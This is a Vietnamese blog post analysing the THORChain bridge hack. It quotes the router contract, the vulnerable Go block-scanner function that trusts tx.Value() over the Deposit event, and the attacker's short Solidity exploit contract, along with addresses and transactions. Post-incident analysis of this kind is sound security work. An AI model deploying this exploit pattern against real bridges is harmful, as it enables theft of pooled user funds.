![image.png](https://images.viblo.asia/3e29dc59-9b24-4c4f-b91b-30aea013213c.png)
> Ai mà ngờ một vị thần có số má như Thor mà cũng có ngày bị hack mất 5M USD!<br>
> Phải chăng Hela - bà chị "guộc" của Thor đã gây ra việc này? Hay vị thần Loki đứng sau tất cả?

Các địa chỉ liên quan đến cuộc tấn công này:
- THORChain Exploiter 2: 0x3a196410a0f5facd08fd7880a4b8551cd085c031
- THORChain Exploiter Contract: 0x4a33862042d004d3fc45e284e1aafa05b48e3c9c
- THORChain Router (nạn nhân) : 0xC145990E84155416144C532E31f89B840Ca8c2cE

Lúc đầu mình định tham khảo bài viết trên https://rekt.news/thorchain-rekt/ nhưng mình nhận ra họ đang dẫn chứng sai và bài viết khá sơ sài nên mình quyết định tự tìm hiểu.

### Kiến trúc Bridge của Thorchain
Trong Cryptocurrency Universe tồn tại rất nhiều chain, trên mỗi chain lại có vô số loại coin khác nhau, từ thuở sơ khai người ta đã mơ về việc di chuyển coin từ chain này sang chain kia một cách dễ dàng. 

Đã có nhiều Bridge được sinh ra với nhiệm vụ kết nối các chain lại với nhau như Anyswap, Binance Bridge,.. đa số các Bridge này đều được xây dựng theo lối kiến trúc lock liquidity ở 2 đầu, các Validator sẽ có nhiệm vụ lắng nghe event hoặc xử lý các transaction lock ở chain nguồn và unlock ở chain đích. Chúng hoạt động theo kiểu lock và unlock gần như là ngay lập tức, không có giao dịch phái sinh nào khác trên các Validator.

> Kiến trúc Bridge của Thorchain có gì đặc biệt?

![image.png](https://images.viblo.asia/d640b268-7418-494c-9999-340bd789b689.png)

Như tên gọi Thorchain, Bridge này thực chất lại là một chain được build từ Cosmos-sdk. Cosmos-sdk đã quá nổi tiếng trong Cryptocurrency Universe, với ưu điểm cho phép định nghĩa chain, coin trong chain và logic giao dịch coin một cách dễ dàng, nó đã được ông lớn Binance tin chọn để build sàn. Và cũng chính Cosmos-sdk đã đặt nền móng cho tư tưởng IBC (Inter Blockchain Communication) có thể được xem là cross-chain đời đầu.

Nhận thấy điều này, Thor đã chọn Cosmos-sdk làm loại vật liệu chính cho Bridge của mình. 

Trong Thorchain, các node được tự do tham giam vào chain bằng cách đặt số tiền ký quỹ nhất định, số tiền này sẽ được trả lại khi node rời đi. Các node sẽ có nhiệm vụ lắng nghe block từ các chain bên ngoài (hiện tại gồm có Ethereum, Binance Smart Chain, Bitcoin, BitcoinCash, DogeCoin, LiteCoin) sau đó xử lý chúng, lưu các thông tin lấy được từ các block vào Thorchain (Bifrost layer), dễ thấy rằng các node trong Thorchain sẽ đồng thuận với nhau bằng IBC của chính Cosmos-sdk.

Trong Thorchain, native coin là RUNE, được dùng để tính phí giao dịch swap cũng như gas.

### Vậy user sẽ tham gia vào Thorchain bằng cách nào?

Chẳng hạn 1 user trên Ethereum muốn deposit tiền vào Thorchain, anh ta sẽ thông qua giao diện của Thorchain gọi vào hàm `deposit()` trên smart contract `THORChain_Router` mà Thor đã deploy.
```javascript
// Deposit an asset with a memo. ETH is forwarded, ERC-20 stays in ROUTER
function deposit(address payable vault, address asset, uint amount, string memory memo) public payable nonReentrant{
    uint safeAmount;
    if(asset == address(0)){
        safeAmount = msg.value;
        (bool success,) = vault.call{value:safeAmount}("");
        require(success);
     } else if(asset == RUNE) {
        safeAmount = amount;
        iRUNE(RUNE).transferTo(address(this), amount);
        iERC20(RUNE).burn(amount);
     } else {
        safeAmount = safeTransferFrom(asset, amount); // Transfer asset
        vaultAllowance[vault][asset] += safeAmount; // Credit to chosen vault
     }
     emit Deposit(vault, asset, safeAmount, memo);
}
```

Ở đây có các tham số:
- vault: là một địa chỉ ví nằm trong danh sách các địa chỉ cho phép người dùng deposit tiền vào. Theo như documentation của Thorchain, với 100 node sẽ có khoảng 3 Vault được dùng để deposit, còn Vault để người dùng withdraw lại có 100 Vault, nghĩa là mỗi node sẽ có 1 Vault withdraw riêng.
- asset: địa chỉ của coin, nếu coin là ETH thì giá trị này là address(0).
- amount: số lượng
- memo: sẽ có dạng SWAP:ETH.ETH:RECEIVER_ADDRESS hoặc SWAP:ETH.DAI-DAI_ADDRESS:RECEIVER_ADDRESS,... Memo này có ý nghĩa thể hiện mục tiêu của user là muốn swap coin nào sang coin nào và địa chỉ nhận là địa chỉ nào trên chain nào.

Các node của Thorchain sẽ liên tục lắng nghe các block trên Ethereum và xử lý các giao dịch trong chúng. Node sẽ xác định loại transaction dựa vào meme trong giao dịch `deposit()`, nó có thể là add Liquidity hoặc swap (có thể swap cùng chain hoặc crosschain), do đó Thorchain đã sinh ra 2 loại users:
- Liquidity provider: user này sẽ cung cấp liquidity cho pool và được chia fee từ các giao dịch swap, thông tin các pool này được lưu vào Thorchain
- User thường: thực hiện swap và mất fee, họ gọi hàm `deposit` với memo tương ứng trên smart contract,  các node sẽ xử lý và xác thực transaction và lưu thông tin và Thorchain, sau đó gọi hàm `transferOut()` để gửi token đầu ra đến địa chỉ người nhận ở chain tương ứng.
    
 Hàm `transferOut`:
 ```javascript
 // Any vault calls to transfer any asset to any recipient.
 function transferOut(address payable to, address asset, uint amount, string memory memo) public payable nonReentrant {
     uint safeAmount; bool success;
     if(asset == address(0)){
         safeAmount = msg.value;
         (success,) = to.call{value:msg.value}(""); // Send ETH
     } else {
         vaultAllowance[msg.sender][asset] -= amount; // Reduce allowance
         (success,) = asset.call(abi.encodeWithSignature("transfer(address,uint256)" , to, amount));
         safeAmount = amount;
    }
    require(success);
    emit TransferOut(msg.sender, to, asset, safeAmount, memo);
}
```

### Lỗ hổng nằm ở đâu?

Câu trả lời là nó nằm ở Bifrost Layer của node, cụ thể hơn là module `Ethereum Block Scanner` của node.

Oke, bây giờ chúng ta sẽ lần theo các commit của Thorchain trên gitlab trong repo `thornode` của họ.

Họ có 1 commit được đặt là `Resolve "[BUG] Fix ETH chain attack"` với hash là `eab0715650919a1f1ba525011423e71b53ffb27b`, như vậy chúng ta sẽ tập trung vào commit này, đặc biệt là file ` bifrost/pkg/chainclients/ethereum/ethereum_block_scanner.go`. 

Chúng ta thấy họ đã có 1 vài thay đổi quan trọng trong hàm `getTxInFromSmartContract()` ở khoảng dòng 854 đổ xuống https://gitlab.com/thorchain/thornode/-/commit/eab0715650919a1f1ba525011423e71b53ffb27b#4e8376fdec8edf86c2833023ec44a12c1c2048cb_854_854, rất có thể lỗ hổng nằm ở đây. 

Chúng ta cùng xem code của hàm này trước khi commit `Resolve "[BUG] Fix ETH chain attack"` được merge.
```javascript
// getTxInFromSmartContract returns txInItem
func (e *ETHScanner) getTxInFromSmartContract(tx *etypes.Transaction, receipt *etypes.Receipt) (*stypes.TxInItem, error) {
	e.logger.Debug().Msg("parse tx from smart contract")
	txInItem := &stypes.TxInItem{
		Tx: tx.Hash().Hex()[2:],
	}
	sender, err := e.eipSigner.Sender(tx)
	if err != nil {
		return nil, fmt.Errorf("fail to get sender: %w", err)
	}
	txInItem.Sender = strings.ToLower(sender.String())
	// 1 is Transaction success state
	if receipt.Status != 1 {
		e.logger.Info().Msgf("tx(%s) state: %d means failed , ignore", tx.Hash().String(), receipt.Status)
		return nil, nil
	}
	for _, item := range receipt.Logs {
		switch item.Topics[0].String() {
		case depositEvent:
			depositEvt, err := e.parseDeposit(*item)
			if err != nil {
				return nil, fmt.Errorf("fail to parse deposit event: %w", err)
			}
			e.logger.Info().Msgf("deposit:%+v", depositEvt)
			txInItem.To = depositEvt.To.String()
			txInItem.Memo = depositEvt.Memo
			asset, err := e.getAssetFromTokenAddress(depositEvt.Asset.String())
			if err != nil {
				return nil, fmt.Errorf("fail to get asset from token address: %w", err)
			}
			if asset.IsEmpty() {
				return nil, nil
			}
			decimals := e.getTokenDecimalsForTHORChain(depositEvt.Asset.String())
			e.logger.Info().Msgf("token:%s,decimals:%d", depositEvt.Asset, decimals)
			txInItem.Coins = append(txInItem.Coins, common.NewCoin(asset, e.convertAmount(depositEvt.Asset.String(), depositEvt.Amount)).WithDecimals(decimals))
		case transferOutEvent:
			transferOutEvt, err := e.parseTransferOut(*item)
			if err != nil {
				return nil, fmt.Errorf("fail to parse transfer out event: %w", err)
			}
			e.logger.Info().Msgf("transfer out: %+v", transferOutEvt)
			txInItem.Sender = transferOutEvt.Vault.String()
			txInItem.To = transferOutEvt.To.String()
			txInItem.Memo = transferOutEvt.Memo
			asset, err := e.getAssetFromTokenAddress(transferOutEvt.Asset.String())
			if err != nil {
				return nil, fmt.Errorf("fail to get asset from token address: %w", err)
			}
			if asset.IsEmpty() {
				return nil, nil
			}
			decimals := e.getTokenDecimalsForTHORChain(transferOutEvt.Asset.String())
			txInItem.Coins = append(txInItem.Coins, common.NewCoin(asset, e.convertAmount(transferOutEvt.Asset.String(), transferOutEvt.Amount)).WithDecimals(decimals))
		case transferAllowanceEvent:
			transferAllowanceEvt, err := e.parseTransferAllowanceEvent(*item)
			if err != nil {
				return nil, fmt.Errorf("fail to parse transfer allowance event: %w", err)
			}
			e.logger.Info().Msgf("transfer allowance: %+v", transferAllowanceEvt)
			txInItem.Sender = transferAllowanceEvt.OldVault.String()
			txInItem.To = transferAllowanceEvt.NewVault.String()
			txInItem.Memo = transferAllowanceEvt.Memo
			asset, err := e.getAssetFromTokenAddress(transferAllowanceEvt.Asset.String())
			if err != nil {
				return nil, fmt.Errorf("fail to get asset from token address: %w", err)
			}
			if asset.IsEmpty() {
				return nil, nil
			}
			decimals := e.getTokenDecimalsForTHORChain(transferAllowanceEvt.Asset.String())
			txInItem.Coins = append(txInItem.Coins, common.NewCoin(asset, e.convertAmount(transferAllowanceEvt.Asset.String(), transferAllowanceEvt.Amount)).WithDecimals(decimals))
		case vaultTransferEvent:
			transferEvent, err := e.parseVaultTransfer(*item)
			if err != nil {
				return nil, fmt.Errorf("fail to parse vault transfer event: %w", err)
			}
			e.logger.Info().Msgf("vault transfer: %+v", transferEvent)
			txInItem.Sender = transferEvent.OldVault.String()
			txInItem.To = transferEvent.NewVault.String()
			txInItem.Memo = transferEvent.Memo
			for _, item := range transferEvent.Coins {
				asset, err := e.getAssetFromTokenAddress(item.Asset.String())
				if err != nil {
					return nil, fmt.Errorf("fail to get asset from token address: %w", err)
				}
				if asset.IsEmpty() {
					return nil, nil
				}
				decimals := e.getTokenDecimalsForTHORChain(item.Asset.String())
				txInItem.Coins = append(txInItem.Coins, common.NewCoin(asset, e.convertAmount(item.Asset.String(), item.Amount)).WithDecimals(decimals))
			}
		}
	}
	// it is important to keep this part outside the above loop, as when we do router upgrade , which might generate multiple deposit event , along with tx that has eth value in it
	ethValue := cosmos.NewUintFromBigInt(tx.Value())
	if !ethValue.IsZero() {
		ethValue = e.convertAmount(ethToken, tx.Value())
		if txInItem.Coins.GetCoin(common.ETHAsset).IsEmpty() && !ethValue.IsZero() {
			txInItem.Coins = append(txInItem.Coins, common.NewCoin(common.ETHAsset, ethValue))
		}
	}
	e.logger.Info().Msgf("tx: %s, gas price: %s, gas used: %d,receipt status:%d", txInItem.Tx, tx.GasPrice().String(), receipt.GasUsed, receipt.Status)
	// under no circumstance ETH gas price will be less than 1 Gwei , unless it is in dev environment
	txGasPrice := tx.GasPrice()
	if txGasPrice.Cmp(big.NewInt(tenGwei)) < 0 {
		txGasPrice = big.NewInt(tenGwei)
	}
	txInItem.Gas = common.MakeETHGas(txGasPrice, receipt.GasUsed)
	if txInItem.Coins.IsEmpty() {
		e.logger.Debug().Msgf("there is no coin in this tx, ignore, %+v", txInItem)
		return nil, nil
	}
	e.logger.Debug().Msgf("tx in item: %+v", txInItem)
	return txInItem, nil
}
```

Hàm này có nhiệm vụ kiểm tra xem txn có thành công hay không, nếu có, nó sẽ xử lý các event được emit ra từ txn đó để biết được user đang muốn swap từ coin nào sang coin nào (có thể cùng chain hoặc khác chain) đầu ra của hàm này sẽ được node lưu lại và broadcast lên Thorchain, sau đó các node sẽ gửi coin đến địa chỉ nhận xem như hoàn tất swap. 

Chú ý ở `case depositEvent:` đây là case xử lý khi node event là  event `Deposit(address indexed to, address indexed asset, uint amount, string memo)` của `THORChain_Router` contract. Nó sẽ xác định coin đầu vào, số lượng, memo, sau đó dựa vào memo để xác định coin đầu ra, địa chỉ nhận mong muốn của user. 

Thoát khỏi vòng lặp `for`, nó có 1 đoạn xử lý dành riêng cho việc deposit native coin ETH:
```javascript
// it is important to keep this part outside the above loop, as when we do router upgrade , which might generate multiple deposit event , along with tx that has eth value in it
	ethValue := cosmos.NewUintFromBigInt(tx.Value())
	if !ethValue.IsZero() {
		ethValue = e.convertAmount(ethToken, tx.Value())
		if txInItem.Coins.GetCoin(common.ETHAsset).IsEmpty() && !ethValue.IsZero() {
			txInItem.Coins = append(txInItem.Coins, common.NewCoin(common.ETHAsset, ethValue))
		}
	}
```
Đây chính là lỗ hổng, mặc dù ở trên đã có được thông tin coin và số lượng từ việc phân tích event `Deposit` nhưng ở đây lại phân tích tiếp tx.Value(), điều này đã tạo ra khả năng over-ride thông tin có được trước đó.

Hacker đã nhận thấy điều này và tạo ra một smart contract để tấn công, logic rất đơn giản, nó wrap `THORChain_Router` lại như sau:
```javascript
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.3;

interface IRouter {
    function deposit(
        address payable vault,
        address asset,
        uint256 amount,
        string memory memo
    ) external payable;
}

contract Attack {
    function attack(
        address router,
        address payable vault,
        string memory memo
    ) external payable {
        IRouter(router).deposit{value: 0}(vault, address(0), 0, memo);
        payable(msg.sender).transfer(msg.value);
    }
}

```
Ví dụ, Hacker sẽ gọi vào hàm `attack` với một vault hợp lệ nào đó của Thorchain, memo có thể là "SWAP:ETH.ETH" và msg.value là 100 ETH, sau khi gọi 100 ETH vẫn là của anh ta, nhưng bên trong ```attack``` nó đã gọi đến `deposit()` của `THORChain_Router`. 

Kết hợp smart contract này với hàm `getTxInFromSmartContract()` của node ở trên, Hacker dễ dàng đánh lừa được node rằng anh ta đang muốn swap 100 ETH lấy một coin nào đấy, mặc dù anh ta chả deposit vào một đồng ETH nào. 

Đây là lịch sử txn của Hacker trên Etherescan https://etherscan.io/txsInternal?a=0x3a196410a0f5facd08fd7880a4b8551cd085c031&p=1

Lấy ví dụ txn này  https://etherscan.io/tx/0x32933c28281489256949842b9f4c9f85a6e557553dce2aee35f2f52110cfc0c9 (block 12833255). Hacker đã tấn công với 100ETH, cùng với vault là 0xf56cba49337a624e94042e325ad6bc864436e370, memo là "SWAP:ETH.ETH". 

![image.png](https://images.viblo.asia/5241c0f2-8828-4d21-a9d5-f54a51cc9d50.png)

Chúng ta dễ dàng xem được event được emit ra từ THORChain_Router:
![image.png](https://images.viblo.asia/1e5fef09-8499-4474-9604-a9f2050b2d32.png)

Mặc dù amount của Deposit event là 0, nhưng tx.Value() lại là 100.265 ETH. Do đó node đã nghĩ rằng ai đó đang muốn swap 100 ETH lấy 100 ETH =))).

Thế là xong, hacker chỉ cần ngồi đợi 100ETH về ví mình, giao dịch mà node `transferOut()` 100 ETH cho hacker là đây https://etherscan.io/tx/0x2fcc2757de57d1e954d0e0a5188bcb348d02ee596d1f55be7fa44e94fd27b6c6
![image.png](https://images.viblo.asia/6a5afc85-7875-43df-b06c-391381107679.png)

Hacker đã lặp lại nhiều lần như thế để đánh cắp lẫn ETH và các token ERC20 khác có trong pool, giá trị ước tính khoảng 5 triệu USD.

Hiện tại Thor đang fix Thorchain của mình nhưng việc swap đang được tạm dừng để kiểm tra nốt các lỗ hổng thể có khác.

### Tổng kết
Defi luôn là một mảnh đất màu mỡ đối với các start up cũng như các hacker, càng nhiều mô hình được sinh ra cũng đồng nghĩa càng nhiều lỗ hổng có thể xuất hiện, mà thiệt hại lên đến hàng triệu USD. Nhưng bất cứ điều gì trước khi đạt đến sự hoàn hảo đều phải trải qua rất nhiều tổn thương, khắc phục được nó nghĩa là công nghệ đang ngày càng hoàn thiện.